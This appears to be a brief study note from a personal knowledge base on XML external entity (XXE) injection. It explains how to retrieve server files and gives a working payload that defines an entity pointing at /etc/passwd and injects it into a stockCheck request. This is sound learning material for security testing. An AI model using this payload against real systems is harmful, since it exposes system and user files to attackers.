---
tags: [misc]
---
## Retrieve Files
* Modify the XML in 2 ways
   	* Introduce/edit a DOCTYPE element defining entity containg path to the file
   	* Edit data value in the XML that is returned in applications response to make use of that entity.
   	* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
   	* <stockCheck><productId>&xxe;</productId></stockCheck>
* Good to check all data values in submitted XML

---
**Related:** [[docs/moc/00-Home]] · [[docs/moc/06-Knowledge-Base-MOC]] · [[docs/brain/AMOS_Simulation_Kernel_v0_Math_Foundations]] · [[docs/brain/system_scan_agent]] · [[docs/brain/automation_profiles]]
